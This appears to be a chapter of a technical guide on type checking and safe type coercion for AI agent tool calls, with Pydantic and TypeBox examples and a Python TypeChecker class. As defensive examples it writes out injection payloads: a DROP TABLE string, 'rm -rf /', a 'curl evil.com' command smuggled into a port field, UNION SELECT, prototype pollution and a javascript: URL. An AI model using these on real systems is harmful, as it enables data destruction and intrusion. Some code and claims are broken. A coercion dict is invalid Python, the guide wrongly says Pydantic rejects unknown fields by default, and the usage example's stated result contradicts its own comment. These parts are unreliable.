# 12.3.2 Type Checking — 类型检查与转换

## 简单介绍

Type checking is the process of verifying that data flowing into and through an AI agent system conforms to expected types before it is used in security-sensitive operations (database queries, shell commands, API calls, tool dispatch). In the context of AI agent safety, type checking acts as the **first line of defense**: it rejects malformed or malicious input at the boundary before it can reach internal logic. Unlike value validation (which checks semantics) or sanitization (which removes dangerous characters), type checking operates at the structural level — ensuring a parameter is truly an integer and not a string containing SQL, that an object has the expected shape before its fields are accessed, and that a list is not accidentally passed where a scalar is expected.

For agent systems that accept LLM-generated tool calls, type checking is the most cost-effective security control available: it runs in microseconds, catches entire classes of attacks regardless of payload content, and can be implemented with off-the-shelf schema libraries (Pydantic, Zod, TypeBox) rather than custom security logic.

---

## 基本原理 — Type Safety Prevents Entire Classes of Attacks

Type safety is a **preventive** security mechanism. When enforced at system boundaries, it eliminates entire attack categories at once:

### Attacks Prevented by Type Checking

| Attack Vector | How Type Checking Stops It |
|---|---|
| **SQL Injection** | Rejects `{"id": "1; DROP TABLE users--"}` when `id` is declared as `int` |
| **Shell Injection** | Rejects `{"filename": "foo; rm -rf /"}` when `filename` expects a non-string type or a constrained string pattern |
| **Command Injection via Number Fields** | Prevents `{"port": "22 && curl evil.com"}` from reaching connection logic |
| **Object Pollution** | Rejects unexpected nested structure in `options` parameter when a flat type is declared |
| **JSON Deserialization Attacks** | Catches `{"__proto__": {"admin": true}}` through schema validation before object merge |
| **Denial of Service via Type Abuse** | Prevents `{"iterations": 1e20}` from reaching a loop counter when `int32` is expected |
| **Business Logic Bypass** | Catches `{"role": "admin"}` when `role` is typed as a literal union `"user" \| "viewer"` |

### Key Principle

> **Input type == execution type.** If the schema says a parameter is `int`, every downstream function must receive an `int`, not a string that *looks* like an int. This invariant eliminates ambiguity attacks where type coercion between layers introduces unexpected behavior.

---

## 背景 — Why Type Confusion Bypasses Security Checks

### The Type Confusion Problem

Type confusion occurs when a value passes one type check but is interpreted as a different type by the consumer. This is particularly dangerous in agent systems because:

1. **Python's dynamic typing** makes type confusion invisible at call sites. A function parameter declared as `port: int` will happily receive the string `"3306; select * from secrets"` at runtime if no guard is present.

2. **JSON has fewer types than Python/TypeScript.** JSON only knows string, number, boolean, null, object, array. There is no distinction between `int32` and `int64`, no `URL` type, no `Email` type — everything schema-valid JSON arrives as generic primitives.

3. **LLMs generate plausible but wrong types.** An LLM might call `send_email(to=user_email, cc=None)` where the schema expects `cc: List[str]` — the `None` passes LLM-level validation but fails runtime type checks.

4. **Implicit coercion by frameworks.** `json.loads()` returns `float` for any JSON number, even if the original value was `42`. `Flask.request.args` returns all values as strings. `os.environ` returns all values as strings. Every system boundary is a type confusion opportunity.

### Real-World Attack Scenario

An agent exposes a `run_query(sql: str, limit: int)` tool. The LLM calls `run_query(sql="SELECT * FROM users", limit="10")`. A naive implementation receives the string `"10"` and concatenates it into the SQL: `SELECT * FROM users LIMIT 10`. This works. But the same path receives `run_query(sql="SELECT * FROM users", limit="10; DROP TABLE users; --")` — the string "limit" is injected into SQL. If type checking enforced `limit: int` at the boundary, the injection string would be rejected before reaching any SQL logic.

```python
# Dangerous: implicit string concatenation
query = f"SELECT * FROM users LIMIT {limit}"  # limit = "10; DROP TABLE users; --"

# Safe: type guard rejects non-int
if not isinstance(limit, int):
    raise TypeError(f"limit must be int, got {type(limit).__name__}")
query = f"SELECT * FROM users LIMIT {limit}"
```

---

## 核心矛盾 — Strict Typing vs Flexibility for LLM-Generated Tool Calls

The central tension in agent type checking:

| Strict Typing | Flexible Typing |
|---|---|
| Prevents injection and confusion attacks | Accepts LLM outputs with minor type mismatches |
| Rejects valid requests with wrong-but-harmless types | Reduces false rejections in production |
| Simple, predictable, auditable | Complex coercion rules, harder to reason about |
| May frustrate LLM tool-use accuracy | Better user experience, higher task completion |

### The LLM Type Noise Problem

LLMs frequently introduce type errors in tool calls that are **structurally wrong but semantically harmless**:

- Passing `"42"` (string) where `42` (int) is expected
- Passing `["item"]` (list) where `"item"` (string) is expected — single-element list instead of scalar
- Omitting optional fields entirely (valid) vs passing `null` (depends on schema)
- Passing `user.name` instead of `user_id` — semantically wrong, type-correct

### Pragmatic Resolution: Coercion Whitelist

The recommended approach is a **coercion whitelist** — accept common, harmless type mismatches while rejecting dangerous ones:

```python
SAFE_COERCIONS = {
    # (declared_type, actual_type): coercion_rule
    (int, str): {"transform": int, "safe": lambda s: s.isdigit() and len(s) < 20},
    (float, str): {"transform": float, "safe": lambda s: _is_safe_float(s)},
    (str, int): {"transform": str, "safe": lambda i: True},  # int -> str always safe
    (str, float): {"transform": str, "safe": lambda f: True},  # float -> str always safe
    (list, type(None)): {"transform": lambda _: [], "safe": lambda _: True},  # None -> empty list
}

DANGEROUS_COERCIONS = {
    (int, str): s.isdigit() check fails for "1; rm -rf /",
    (bool, str): "true" and "false" can be ambiguous
}
```

### Tradeoff Decision Matrix

| Scenario | Recommend | Rationale |
|---|---|---|
| Agent exposes internal tools to LLM | **Strict** | Low volume, high stakes, auditable |
| Agent chains public API calls | **Moderate** | Accept coercion for primitives, reject for structured types |
| Agent handles user file upload | **Strict** | File content can be arbitrarily malformed |
| Agent calls external SaaS APIs | **Flexible** | External APIs often coerce types themselves |
| Agent accepts config from external source | **Strict** | Config injection is high-impact |

---

## 详细内容

### 1. Type System Basics for Security

#### Type Narrowing

Restricting a value from a broader type to a narrower one:

```python
def process_value(value: int | str) -> None:
    match value:
        case int():
            _handle_int(value)  # value is narrowed to int
        case str():
            _handle_str(value)  # value is narrowed to str
```

**Security relevance**: Narrowing prevents type confusion by ensuring each branch handles exactly one type. Without narrowing, a value might be processed as `int` when it's actually a `str` containing malicious payload.

#### Union Types

Declaring a parameter can accept one of several types:

```python
UserId: int | str  # accepts both types
```

**Security relevance**: Union types make the coercion policy explicit. Without explicit union types, a developer might handle `int` cases and forget `str` cases, leaving a path where string injection is possible.

#### Generic Types

Parameterized types that maintain type safety across containers:

```python
from typing import Sequence, TypeVar

T = TypeVar("T")

def safe_first(items: Sequence[T]) -> T | None:
    return items[0] if items else None
```

**Security relevance**: Generics prevent type confusion when extracting values from collections. `Sequence[str]` guarantees every element is a string, preventing accidental `int`-as-SQL-injection.

#### Literal Types

Types restricted to specific values:

```python
from typing import Literal

Action = Literal["read", "write", "delete"]  # only these three strings accepted
Role = Literal["user", "admin"]  # only these two strings accepted
```

**Security relevance**: Literal types are the strongest form of type constraint for agent tools. They prevent entire categories of injection by refusing any value outside an explicit allowlist.

---

### 2. Safe Type Coercion

Not all type conversions are equally safe. The following matrix defines safe vs dangerous coercions:

#### Always Safe (automatic)

| From | To | Notes |
|---|---|---|
| `int` | `float` | Widening conversion, no data loss for most practical ranges |
| `int` | `str` | `str(42)` — always produces a safe numeric string |
| `float` | `str` | Always produces a safe numeric string |
| `bool` | `int` | `True -> 1`, `False -> 0` |
| `None` | empty `list` | Semantically meaningful for optional list params |
| `None` | empty `dict` | Semantically meaningful for optional dict params |
| subtype | supertype | Dog -> Animal, no type confusion possible |

#### Conditionally Safe (requires validation)

| From | To | Validation Required |
|---|---|---|
| `str` | `int` | Must be pure digits, no leading zeros ambiguity, within range |
| `str` | `float` | Must be valid float string, not `nan`/`inf` for security contexts |
| `str` | `bool` | Only specific strings: `"true"`/`"false"`, `"1"`/`"0"` |
| `str` | `Enum` | Must match exactly one enum member |
| `str` | `UUID` | Must match UUID regex pattern |
| `str` | `datetime` | Must match ISO 8601 exactly |
| `list[T]` | `T` | Only when list has exactly one element (unwrap), and T is safe |

#### Never Safe (must reject)

| From | To | Why Dangerous |
|---|---|---|
| `str` | `int` via `eval()` | Code execution risk |
| `str` | `dict` via `json.loads()` | Arbitrary JSON structure, prototype pollution |
| `str` | `callable` | Arbitrary code execution |
| `bytes` | `str` via `.decode()` | Encoding confusion, binary injection |
| `object` | any specific type | Must know actual runtime type first |
| `dict` | named tuple via `**kwargs` | Key injection into function calls |

#### Coercion Implementation Pattern

```python
from typing import Any, Callable, TypeAlias

CoercionRule: TypeAlias = dict[str, Any]

SAFE_COERCIONS: dict[tuple[type, type], CoercionRule] = {
    (int, str): {
        "check": lambda s: isinstance(s, str) and s.lstrip("-").isdigit(),
        "transform": int,
        "error": "String must contain only digits",
    },
    (float, str): {
        "check": lambda s: isinstance(s, str) and _is_safe_float_str(s),
        "transform": float,
        "error": "String must be a valid float representation",
    },
    (bool, str): {
        "check": lambda s: s.lower() in ("true", "false", "1", "0"),
        "transform": lambda s: s.lower() in ("true", "1"),
        "error": "String must be 'true', 'false', '1', or '0'",
    },
    (list, type(None)): {
        "check": lambda n: n is None,
        "transform": lambda _: [],
        "error": None,
    },
}

def coerce_or_reject(value: Any, target_type: type) -> Any:
    """Attempt safe coercion, raise TypeError if impossible."""
    if isinstance(value, target_type):
        return value

    key = (target_type, type(value))
    if key in SAFE_COERCIONS:
        rule = SAFE_COERCIONS[key]
        if rule["check"](value):
            return rule["transform"](value)
        raise TypeError(
            f"Cannot coerce {type(value).__name__} to {target_type.__name__}: "
            f"{rule.get('error', 'value failed validation')}"
        )

    raise TypeError(
        f"Type mismatch: expected {target_type.__name__}, "
        f"got {type(value).__name__}. No safe coercion available."
    )
```

---

### 3. Type Confusion Attacks

Type confusion attacks exploit the gap between how a value is declared and how it is interpreted. In agent systems, these are the most common type-related vulnerabilities.

#### Attack 1: String Expected, Object Delivered

```python
# Schema declares: name: str
# Attacker sends: {"name": {"__proto__": {"admin": true}}}
name = tool_call["name"]  # type: ignore
print(name["__proto__"])  # Reaches into object, bypasses admin check
```

**Mitigation**: Reject any value that is not `str` when `str` is declared. Never recursively access properties of a value expected to be primitive.

#### Attack 2: Integer Expected, String Delivered (Injection)

```python
# Schema declares: limit: int
# Attacker sends: {"limit": "10 UNION SELECT * FROM admin_users--"}
query = f"SELECT * FROM items LIMIT {arguments['limit']}"
```

**Mitigation**: Reject non-int values for int parameters. Never format strings with unvalidated arguments.

#### Attack 3: Array Expected, Single Value Delivered

```python
# Schema declares: recipients: list[str]
# Attacker sends: {"recipients": "admin@example.com"}
for r in recipients:  # Iterates over characters of the string!
    send_email(r)  # Sends to 'a', 'd', 'm', 'i', 'n', ...
```

**Mitigation**: Check `isinstance(value, list)` before iterating. Do not rely on duck typing for security-critical iteration.

#### Attack 4: URL Type Confusion

```python
# Schema declares: url: str
# Attacker sends: {"url": "javascript:alert(1)"}
# Redirect logic executes JS in agent's browser context
```

**Mitigation**: Use `UrlStr` / `HttpUrl` types that validate URL scheme and format. Reject non-http(s) URLs.

#### Attack 5: Boolean Bypass

```python
# Schema declares: is_admin: bool
# Python's bool is a subclass of int: True == 1, False == 0
# Attacker sends: {"is_admin": 1}  # JSON number, parsed as int in Python
if arguments["is_admin"]:  # True for 1, bypasses admin check
    grant_access()
```

**Mitigation**: Check `isinstance(value, bool)` explicitly. In Python, `isinstance(True, int)` returns `True`, so check `bool` before `int`.

#### Attack 6: JSON Prototype Pollution

```python
# Attacker sends a JSON object with __proto__ key
payload = '{"__proto__": {"polluted": true}, "name": "test"}'
data = json.loads(payload)
# data["__proto__"] might pollute Object.prototype in JavaScript-based agents
```

**Mitigation**: Use `strip_proto` or reject objects containing `__proto__` or `constructor` keys. For Python agents, this is less relevant but still worth guarding against in `**kwargs` expansion.

---

### 4. Python Pydantic Type Validation

Pydantic is the de facto standard for type-safe data validation in Python agent frameworks. It provides schema definition, automatic type coercion, and validation error reporting.

#### BaseModel — Foundation for Type-Safe Schemas

```python
from pydantic import BaseModel, Field, ValidationError

class DatabaseQuery(BaseModel):
    sql: str = Field(..., min_length=1, max_length=10000)
    params: dict[str, str | int | float | bool] = Field(default_factory=dict)
    timeout: int = Field(default=30, ge=1, le=300)
    readonly: bool = Field(default=True)

# Safe: validation passes
query = DatabaseQuery(sql="SELECT * FROM users WHERE id = :id", params={"id": 42})

# Dangerous: rejected at construction
try:
    query = DatabaseQuery(sql="SELECT * FROM users", timeout=-1)
except ValidationError as e:
    print(f"Validation failed: {e.errors()}")  # timeout must be >= 1
```

**Security properties**:
- Unknown fields are rejected by default (`extra="forbid"`)
- Type coercion is applied with strict mode available
- Validation errors include field-level detail for debugging
- Nested models provide recursive type safety

#### Field Validation — Constraining Values

```python
from pydantic import BaseModel, Field, field_validator
import re

class ExecuteCommand(BaseModel):
    model_config = {"extra": "forbid"}  # Reject unknown fields

    command: str = Field(..., min_length=1, max_length=200)
    args: list[str] = Field(default_factory=list, max_length=10)
    timeout: int = Field(default=30, ge=1, le=3600)

    @field_validator("command")
    @classmethod
    def no_shell_metacharacters(cls, v: str) -> str:
        if re.search(r"[;&|`$()]", v):
            raise ValueError(f"Command contains shell metacharacters: {v!r}")
        return v

    @field_validator("args")
    @classmethod
    def args_no_injection(cls, v: list[str]) -> list[str]:
        for arg in v:
            if re.search(r"[;&|`$()]", arg):
                raise ValueError(f"Arg contains shell metacharacters: {arg!r}")
        return v
```

#### Custom Types for Agent Security

```python
from pydantic import BaseModel, GetCoreSchemaHandler
from pydantic_core import CoreSchema, core_schema
from typing import Any

class SQLIdentifier(str):
    """A validated SQL identifier (table name, column name)."""

    @classmethod
    def __get_pydantic_core_schema__(
        cls, source_type: Any, handler: GetCoreSchemaHandler
    ) -> CoreSchema:
        return core_schema.no_info_wrap_validator_function(
            cls._validate,
            core_schema.str_schema(),
        )

    @classmethod
    def _validate(cls, value: str) -> str:
        if not value.isidentifier():
            raise ValueError(f"Not a valid SQL identifier: {value!r}")
        if value.lower() in ("drop", "delete", "truncate", "alter", "exec"):
            raise ValueError(f"SQL reserved word not allowed: {value!r}")
        return value

class EmailStr:
    """Requires pydantic-extra-types or custom regex."""

class SafeUrl(BaseModel):
    url: str
    allowed_schemes: tuple[str, ...] = ("https",)

    @field_validator("url")
    @classmethod
    def validate_url(cls, v: str) -> str:
        from urllib.parse import urlparse
        parsed = urlparse(v)
        if parsed.scheme not in ("https", "http"):
            raise ValueError(f"Unsupported URL scheme: {parsed.scheme}")
        # Block internal/hostname-only URLs
        if parsed.hostname in ("localhost", "127.0.0.1", "0.0.0.0", "::1"):
            raise ValueError("Internal URLs not allowed")
        return v
```

#### Built-in Pydantic Security Types

| Type | What It Validates | Example |
|---|---|---|
| `EmailStr` | RFC 5322 email format | `user@example.com` |
| `UrlStr` | URL format with scheme validation | `https://api.example.com/v1` |
| `SecretStr` | String that is not displayed in logs/repr | `******` |
| `SecretBytes` | Bytes not displayed in logs | `******` |
| `IPv4Address` | Valid IPv4 address | `192.168.1.1` |
| `IPv6Address` | Valid IPv6 address | `::1` |
| `UUID4` | UUID v4 format | `550e8400-e29b-41d4-...` |
| `PastDate` | Date in the past | `2023-01-01` |
| `FutureDate` | Date in the future | `2026-12-31` |
| `Color` | Valid CSS color | `#ff0000` |

#### Strict Mode — No Coercion

```python
from pydantic import BaseModel, ConfigDict

class StrictQuery(BaseModel):
    model_config = ConfigDict(strict=True)  # No coercion allowed
    limit: int

StrictQuery(limit=5)      # OK
StrictQuery(limit="5")    # ValidationError: Input should be a valid integer
```

**Use strict mode when**: the input is untrusted (LLM calls to sensitive tools, user-provided config).

---

### 5. TypeScript/TypeBox for Agent — End-to-End Type Safety

For agent systems where the tool definition language is TypeScript (e.g., OpenAI tool definitions, Vercel AI SDK), TypeBox provides runtime type checking from schema definitions.

#### TypeBox Tool Definition

```typescript
import { Type, Static } from "@sinclair/typebox";
import { Value } from "@sinclair/typebox/value";

// Define tool parameter schema with full type constraints
const SearchDatabaseSchema = Type.Object({
  query: Type.String({ minLength: 1, maxLength: 500 }),
  limit: Type.Integer({ minimum: 1, maximum: 100, default: 10 }),
  offset: Type.Optional(Type.Integer({ minimum: 0 })),
  sort: Type.Optional(Type.Union([
    Type.Literal("asc"),
    Type.Literal("desc"),
  ])),
  filters: Type.Optional(Type.Record(Type.String(), Type.Unknown())),
}, { additionalProperties: false });

type SearchDatabaseParams = Static<typeof SearchDatabaseSchema>;

// Runtime validation
function validateToolCall(input: unknown): SearchDatabaseParams {
  if (!Value.Check(SearchDatabaseSchema, input)) {
    const errors = [...Value.Errors(SearchDatabaseSchema, input)];
    throw new ToolValidationError(errors.map(e => `${e.path}: ${e.message}`));
  }
  return input as SearchDatabaseParams;
}
```

#### End-to-End Type Safety Chain

```typescript
// 1. Schema definition (single source of truth)
const SendEmailSchema = Type.Object({
  to: Type.String({ format: "email" }),
  subject: Type.String({ minLength: 1, maxLength: 200 }),
  body: Type.String(),
  priority: Type.Optional(Type.Union([
    Type.Literal("low"),
    Type.Literal("normal"),
    Type.Literal("high"),
  ])),
});

// 2. Type inference (compile-time type safety)
type SendEmailParams = Static<typeof SendEmailSchema>;

// 3. Runtime validation (security boundary)
function validateEmailCall(input: unknown): SendEmailParams { /* ... */ }

// 4. Execution with guaranteed types
async function sendEmailTool(params: SendEmailParams): Promise<string> {
  // params.to is guaranteed to be a valid email string
  // params.priority is guaranteed to be "low" | "normal" | "high" or undefined
  const validated = validateEmailCall(params);
  return await emailService.send(validated);
}
```

#### TypeBox Security Features

| Feature | Security Benefit |
|---|---|
| `Type.Integer` vs `Type.Number` | Prevents float injection where int expected |
| `Type.Literal(...)` | Only exact values accepted, prevents injection |
| `Type.Union([...])` | Explicit type alternatives, no implicit coercion |
| `additionalProperties: false` | Rejects unknown keys, prevents object injection |
| `format: "email"` | Format validation without custom regex |
| `Type.Record(...)` | Constrained key-value map, prevents prototype pollution |
| `Value.Encode()` | Canonicalizes values, removes ambiguity |

---

### 6. Runtime Type Checking

Even with schema validation at the boundary, runtime type checks inside agent logic provide defense-in-depth.

#### isinstance() — The Foundation

```python
def execute_tool(name: str, args: dict[str, Any]) -> Any:
    tool = get_tool(name)
    for param_name, expected_type in tool.param_types.items():
        if param_name not in args:
            if tool.is_required(param_name):
                raise MissingArgumentError(param_name)
            continue
        actual = args[param_name]
        if not isinstance(actual, expected_type):
            raise TypeError(
                f"Parameter {param_name!r}: expected {expected_type.__name__}, "
                f"got {type(actual).__name__}"
            )
    return tool.fn(**args)
```

#### Type Guards (Python 3.10+)

```python
from typing import TypeGuard

def is_safe_string(value: object) -> TypeGuard[str]:
    """Check value is a str AND does not contain dangerous patterns."""
    if not isinstance(value, str):
        return False
    dangerous = re.compile(r"[\";`$<>]")
    return not dangerous.search(value)

def process_message(msg: object) -> None:
    if not is_safe_string(msg):
        raise SecurityError("Message contains dangerous characters")
    # msg is now narrowed to str, and known to be safe
    print(msg)
```

#### Protocol Checking — Structural Subtyping

```python
from typing import Protocol, runtime_checkable

@runtime_checkable
class ExecutableTool(Protocol):
    name: str
    def execute(self, args: dict[str, Any]) -> Any: ...

def run_tool(obj: object) -> Any:
    if not isinstance(obj, ExecutableTool):
        raise TypeError(f"Object {type(obj).__name__} is not a valid tool")
    return obj.execute({})
```

**Security note**: Protocol checks verify structural conformance, not intent. A malicious object can implement `ExecutableTool` protocol. Use protocol checking as a **safety net**, not the primary security boundary.

#### Match/Case Structural Pattern Matching

```python
def validate_tool_call(call: object) -> str | None:
    """Returns None if valid, error message if invalid."""
    match call:
        case {"tool": str() as name, "args": dict() as args}:
            return None  # Valid structure
        case {"tool": name, "args": _}:
            return f"tool name must be a string, got {type(name).__name__}"
        case {"tool": _}:
            return "args must be a dictionary"
        case _:
            return "Call must be an object with 'tool' and 'args' fields"
```

---

### 7. Numeric Type Safety

Numeric types have special security considerations that go beyond simple type checking.

#### Integer Overflow

Python integers are arbitrary precision, but downstream systems (databases, C extensions, hardware APIs) may not be:

```python
from pydantic import BaseModel, Field

class Pagination(BaseModel):
    page: int = Field(default=1, ge=1, le=10**6)
    page_size: int = Field(default=20, ge=1, le=1000)

    @property
    def offset(self) -> int:
        # Guard against overflow in downstream SQL
        result = (self.page - 1) * self.page_size
        if result > 10**9:
            raise OverflowError(f"Offset {result} exceeds maximum safe value")
        return result
```

#### Float Precision Attacks

```python
class FinancialOperation(BaseModel):
    amount: float

    @field_validator("amount")
    @classmethod
    def no_precision_abuse(cls, v: float) -> float:
        # Float precision can cause rounding attacks
        if v != 0.0 and abs(v) < 0.01:
            raise ValueError(f"Amount {v} too small, possible precision abuse")
        return round(v, 2)  # Round to cents
```

#### Big Number DoS

```python
class LoopOperation(BaseModel):
    iterations: int = Field(default=1, ge=1, le=10_000)

    @field_validator("iterations")
    @classmethod
    def prevent_dos(cls, v: int) -> int:
        # Even though Python handles big ints, iteration count must be bounded
        if v > 10_000:
            raise ValueError(f"Iterations {v} exceeds maximum 10000")
        return v
```

#### Numeric Type Best Practices

| Type | Risk | Mitigation |
|---|---|---|
| `int` | SQL injection via string, overflow via huge int | Parse from str with strict check, bound with `ge`/`le` |
| `float` | Precision comparison attacks, NaN/Inf | Use `Decimal` for financial, reject NaN/Inf in security contexts |
| `Decimal` | Performance DoS via huge precision | Bound `max_digits` and `decimal_places` |
| `bool` | `isinstance(True, int)` is True | Check `bool` before `int` in isinstance chains |
| complex | Security-irrelevant but rarely expected | Reject unless explicitly needed |

---

## Example Code: Python TypeChecker with Safe Coercion Rules

Below is a comprehensive `TypeChecker` class for agent systems, incorporating safe coercions, type confusion detection, and clear error reporting.

```python
"""
TypeChecker: Runtime type validation with safe coercion for AI agent systems.

Features:
- Strict type checking for security-critical parameters
- Safe coercion whitelist for common LLM type mismatches
- Type confusion detection (e.g., object where string expected)
- Recursive checking for nested structures
- Clear error messages for debugging and audit logging
"""

from typing import Any, Callable, get_origin, get_args, Union, Optional
from collections.abc import Mapping, Sequence
import re
import decimal
from datetime import datetime, date


class TypeCheckError(TypeError):
    """Raised when type validation fails, with detailed context."""

    def __init__(self, path: str, expected: str, actual: str, detail: str = ""):
        self.path = path
        self.expected = expected
        self.actual = actual
        self.detail = detail
        super().__init__(f"{path}: expected {expected}, got {actual}. {detail}".strip())


class TypeChecker:
    """
    Runtime type checker with safe coercion for agent tool parameters.

    Usage:
        checker = TypeChecker(strict=False)  # allow safe coercion
        checker.check_param("limit", value, int)
        checker.check_param("email", value, str)
    """

    def __init__(self, strict: bool = False):
        self.strict = strict
        self._coercion_rules = self._build_coercion_rules()

    # ------------------------------------------------------------------
    # Public API
    # ------------------------------------------------------------------

    def check_param(
        self,
        name: str,
        value: Any,
        expected_type: type,
        path: str | None = None,
    ) -> Any:
        """
        Validate a parameter's type, applying safe coercion if possible.

        Returns the (possibly coerced) value, or raises TypeCheckError.

        Args:
            name: Parameter name (for error messages)
            value: The value to check
            expected_type: The expected type
            path: Dot-separated path for nested validation (auto-generated)
        """
        full_path = f"{path}.{name}" if path else name

        # Handle generic types (list[str], dict[str, int], Optional[str], etc.)
        origin = get_origin(expected_type)
        args = get_args(expected_type)

        if origin is not None:
            return self._check_generic(full_path, value, origin, args, expected_type)

        # Handle Union / Optional types
        if expected_type is Union or expected_type is Optional:
            return self._check_union(full_path, value, args)

        # Handle plain types
        return self._check_plain(full_path, value, expected_type)

    def coerce(self, value: Any, target_type: type) -> Any:
        """Apply safe coercion rules. Returns coerced value or raises."""
        key = (target_type, type(value))
        if key in self._coercion_rules:
            rule = self._coercion_rules[key]
            if rule["check"](value):
                return rule["transform"](value)
            raise TypeCheckError(
                "coercion", target_type.__name__, type(value).__name__,
                rule.get("error", "Coercion check failed"),
            )
        raise TypeCheckError(
            "coercion", target_type.__name__, type(value).__name__,
            "No safe coercion path available",
        )

    # ------------------------------------------------------------------
    # Internal: generic type checking
    # ------------------------------------------------------------------

    def _check_plain(
        self, path: str, value: Any, expected: type
    ) -> Any:
        if isinstance(value, expected):
            # Additional safety: bool is subclass of int
            if expected is int and isinstance(value, bool):
                raise TypeCheckError(
                    path, "int", "bool",
                    "Python bool is a subclass of int; explicit bool rejected for int param",
                )
            return value

        if self.strict:
            raise TypeCheckError(
                path, expected.__name__, type(value).__name__,
                "Strict mode: no coercion allowed",
            )

        return self.coerce(value, expected)

    def _check_generic(
        self, path: str, value: Any, origin: type, args: tuple, full_type: type
    ) -> Any:
        # list[T]
        if origin is list:
            if not isinstance(value, list):
                if self.strict:
                    raise TypeCheckError(path, f"list[{args[0].__name__}]", type(value).__name__)
                # Try coercion from tuple or set
                if isinstance(value, (tuple, set)):
                    value = list(value)
                else:
                    raise TypeCheckError(path, f"list[{args[0].__name__}]", type(value).__name__)
            return [self.check_param(f"[{i}]", item, args[0], path) for i, item in enumerate(value)]

        # dict[K, V]
        if origin is dict:
            if not isinstance(value, dict):
                raise TypeCheckError(path, f"dict[{args[0].__name__}, {args[1].__name__}]", type(value).__name__)
            return {
                self.check_param("<key>", k, args[0], path): self.check_param(str(k), v, args[1], path)
                for k, v in value.items()
            }

        # Optional[T] = Union[T, None]
        if origin is Union:
            return self._check_union(path, value, args)

        return value

    def _check_union(
        self, path: str, value: Any, types: tuple[type, ...]
    ) -> Any:
        # None is always valid for Optional
        if value is None:
            if type(None) in types:
                return None
            raise TypeCheckError(path, f"Union[{', '.join(t.__name__ for t in types)}]", "None")

        # Try each type in order
        errors = []
        for t in types:
            if t is type(None):
                continue
            try:
                return self._check_plain(path, value, t)
            except TypeCheckError as e:
                errors.append(str(e))

        raise TypeCheckError(
            path,
            f"Union[{', '.join(t.__name__ for t in types)}]",
            type(value).__name__,
            f"None of the union types matched. Errors: {'; '.join(errors)}",
        )

    # ------------------------------------------------------------------
    # Internal: coercion rule construction
    # ------------------------------------------------------------------

    @staticmethod
    def _build_coercion_rules() -> dict[tuple[type, type], dict]:
        return {
            # Primitive coercions
            (int, str): {
                "check": lambda s: bool(re.fullmatch(r"-?\d+", s)) and len(s) < 100,
                "transform": int,
                "error": "String must be a valid integer (digits only, optional leading minus)",
            },
            (float, str): {
                "check": lambda s: bool(re.fullmatch(r"-?\d+(\.\d+)?([eE][+-]?\d+)?", s))
                                   and s.lower() not in ("nan", "inf", "-nan", "-inf", "+nan", "+inf"),
                "transform": float,
                "error": "String must be a valid float, NaN/Inf not allowed",
            },
            (bool, str): {
                "check": lambda s: s.lower() in ("true", "false", "1", "0", "yes", "no"),
                "transform": lambda s: s.lower() in ("true", "1", "yes"),
                "error": "String must be 'true', 'false', '1', '0', 'yes', or 'no'",
            },
            (str, int): {
                "check": lambda i: isinstance(i, int) and not isinstance(i, bool),
                "transform": str,
                "error": None,
            },
            (str, float): {
                "check": lambda f: isinstance(f, float),
                "transform": str,
                "error": None,
            },
            (str, bool): {
                "check": lambda b: isinstance(b, bool),
                "transform": str,
                "error": None,
            },
            # Collection coercions
            (list, type(None)): {
                "check": lambda n: n is None,
                "transform": lambda _: [],
                "error": None,
            },
            (dict, type(None)): {
                "check": lambda n: n is None,
                "transform": lambda _: {},
                "error": None,
            },
            # Numeric widening
            (float, int): {
                "check": lambda i: not isinstance(i, bool),
                "transform": float,
                "error": None,
            },
        }

    # ------------------------------------------------------------------
    # Type confusion detection
    # ------------------------------------------------------------------

    def detect_type_confusion(self, value: Any, expected_type: type) -> list[str]:
        """
        Analyze a value for potential type confusion issues.
        Returns a list of warnings (empty if clean).
        """
        warnings: list[str] = []
        actual_type = type(value)

        # Bool is subclass of int in Python
        if expected_type is int and isinstance(value, bool):
            warnings.append(f"bool ({value!r}) passed where int expected: bool is subclass of int")

        # String contains what looks like structured data
        if expected_type is str and isinstance(value, str):
            if value.startswith(("{", "[", '"')) and value.endswith(("}", "]", '"')):
                warnings.append(f"str value {value!r} looks like JSON, possible injection vector")
            if re.search(r"[\";`$<>|&]", value):
                warnings.append(f"str value {value!r} contains shell metacharacters")

        # Object passed as primitive
        if expected_type in (str, int, float, bool) and isinstance(value, dict):
            warnings.append(f"dict passed where {expected_type.__name__} expected: possible object injection")

        # List passed as scalar
        if expected_type in (str, int, float, bool) and isinstance(value, list):
            warnings.append(f"list passed where {expected_type.__name__} expected: possible type confusion")

        return warnings

    # ------------------------------------------------------------------
    # High-level validation entry point
    # ------------------------------------------------------------------

    def validate_tool_args(
        self, tool_name: str, args: dict[str, Any], schema: dict[str, type]
    ) -> dict[str, Any]:
        """
        Validate all arguments for a tool call against a type schema.

        Args:
            tool_name: Name of the tool (for error messages)
            args: The arguments dict from the LLM
            schema: Mapping of param name -> expected type

        Returns:
            Validated (and coerced) arguments dict

        Raises:
            TypeCheckError: on first validation failure
        """
        validated: dict[str, Any] = {}
        for param_name, expected_type in schema.items():
            if param_name not in args:
                # Check if Optional (allow missing for Optional)
                origin = get_origin(expected_type)
                args_types = get_args(expected_type)
                if origin is Union and type(None) in args_types:
                    continue  # Optional param omitted, leave as default
                raise TypeCheckError(
                    param_name, str(expected_type), "MISSING",
                    "Required parameter not provided",
                )
            value = args[param_name]

            # Type confusion detection (warning level)
            confusion_warnings = self.detect_type_confusion(value, expected_type)
            for warning in confusion_warnings:
                import logging
                logging.warning(f"[TypeConfusion] {tool_name}.{param_name}: {warning}")

            validated[param_name] = self.check_param(param_name, value, expected_type)

        return validated


# ======================================================================
# Usage Example
# ======================================================================

if __name__ == "__main__":
    checker = TypeChecker(strict=False)

    tool_schema = {
        "query": str,
        "limit": int,
        "offset": int,
        "readonly": bool,
        "tags": list[str],
    }

    # LLM-generated tool call with type noise
    llm_call = {
        "query": "SELECT * FROM users",
        "limit": "100",          # string instead of int (safe coercion)
        "offset": None,          # None -> will fail (not Optional in schema)
        "readonly": "true",      # string instead of bool (safe coercion)
        "tags": ["admin", "user"],  # correct type
    }

    try:
        result = checker.validate_tool_args("query_db", llm_call, tool_schema)
        print(f"Validation passed: {result}")
        # Result: query='SELECT * FROM users', limit=100, readonly=True, tags=['admin', 'user']
    except TypeCheckError as e:
        print(f"Validation failed: {e}")
```

---

## Capability Boundaries — What Type Checking Cannot Do

Type checking is a powerful but **narrow** security control. It operates at the structural level only.

### Beyond Type Checking's Reach

| Safety Concern | Why Type Checking Cannot Help | What Is Needed |
|---|---|---|
| **Semantic validity** | `DELETE FROM users` is a valid string, but semantically destructive | Value whitelisting, query analysis, RBAC |
